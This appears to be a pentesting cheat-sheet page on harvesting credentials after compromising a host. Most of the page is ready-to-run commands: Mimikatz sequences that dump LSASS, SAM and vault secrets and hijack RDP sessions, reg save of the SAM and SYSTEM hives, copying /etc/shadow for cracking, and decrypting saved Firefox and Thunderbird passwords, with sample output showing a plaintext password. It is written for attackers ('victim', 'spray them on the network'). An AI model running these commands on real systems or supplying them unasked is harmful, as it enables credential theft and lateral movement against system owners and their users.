---
description: >-
  After compromising a target is important to recollect the maximum credentials
  to spray them on the network.
---

# Get Credentials

## Looking for Interesting Files

If the target have a web application that use a database try to find the `config.php` file in order to obtain the database connection.

Look what type of applications are installed and look for config files in order to find new pair of creds.

## Mimikatz

Dump all cached logon credentials, SAM, System, LSASS, VAULT....

```
.\mimikatz.exe
privilege::debug 
sekurlsa::logonpasswords full
sekurlsa::wdigest
sekurlsa::credman
lsadump::sam
vault::cred
vault::list
ts::mstsc
ts::sessions



.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords full" "sekurlsa::wdigest" "sekurlsa::credman" "lsadump::sam" "vault::cred" "vault::list" "ts::mstsc" "exit"
```

{% hint style="warning" %}
**Note**: if `sekurlsa::logoncredentials` does not work in Windows 10 or Server 2019 download a older realease.

[mimikatz.exe v 2.1.1](https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/x64)
{% endhint %}

## **Hijacking RDP Session**

To hijack a RDP session we need mimikatz.

```
.\mimikatz.exe
privilege::debug
ts::sessions
ts::mstsc
token::elevate
ts::remote /id:3
```

## SAM and SYSTEM (Win)

You can easily dump the SAM and SYSTEM registries using the command prompt. Just open the `cmd.exe` as Administrator and run the following commands:

```
reg save HKLM\SAM c:\windows\temp\sam
reg save HKLM\SYSTEM c:\windows\temp\system
```

Finally on our kali we just need to use `sam2dump` to get the hashes.

```
samdump2 system sam > hashes.txt
```

## PASSWD and SHADOW (Lin)

Same as Windows, when we **pwn** a privilege user such as **root** we can get system users and passwords. In linux we just need to copy the following files to our attacking machine.

```
/etc/passwd
/etc/shadow
```

Finally on our kali machine we just need to use `unshadow` to get the hashes:

```
unshadow passwd shadow > hashes.txt
```

## Mozilla Firefox / Thunderbird / WaterFox / SeaMonkey

Some users victims uses Mozilla Firefox or Mozilla Thunderbird and stores their credentials without protection.

On windows search the following route:

```
C:\Users\VICTIM\AppData\Roaming
```

Zip the content of Firefox or Thunderbird folder and transfer it to the attacking machine. Once transferred we are going to use `firefox-decrypt` tool to get the plaintext credentials.

```
$ python firefox_decrypt.py /folder/containing/profiles.ini/

Master Password for profile /tmp/Thunderbird/Profiles/s68bba5j.default: 
2021-09-21 19:55:06,811 - WARNING - Attempting decryption with no Master Password

Website:   mailbox://test.local
Username: 'eric'
Password: 'sup3rs3cr3t'

Website:   smtp://test.local
Username: 'eric'
Password: 'sup3rs3cr3t'
```

{% embed url="https://github.com/unode/firefox_decrypt" %}